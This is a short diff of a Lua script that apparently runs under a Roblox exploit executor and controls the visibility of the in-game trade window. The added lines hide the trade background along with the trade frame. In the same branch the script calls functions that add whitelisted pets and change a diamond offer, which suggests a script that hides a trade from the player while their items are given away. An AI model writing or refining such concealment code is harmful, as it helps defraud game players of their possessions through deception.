@@ -148,8 +148,10 @@ TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
         if getgenv().here then
             if getgenv().aol then
                 TradeFrame.Visible = true
+                game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.BKG.Visible = true
             else
                 TradeFrame.Visible = false
+                game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.BKG.Visible = false
                 task.spawn(rt)
                 AddWhitelistedPets()
                 ModifyDiamondOffer(Diamonds)
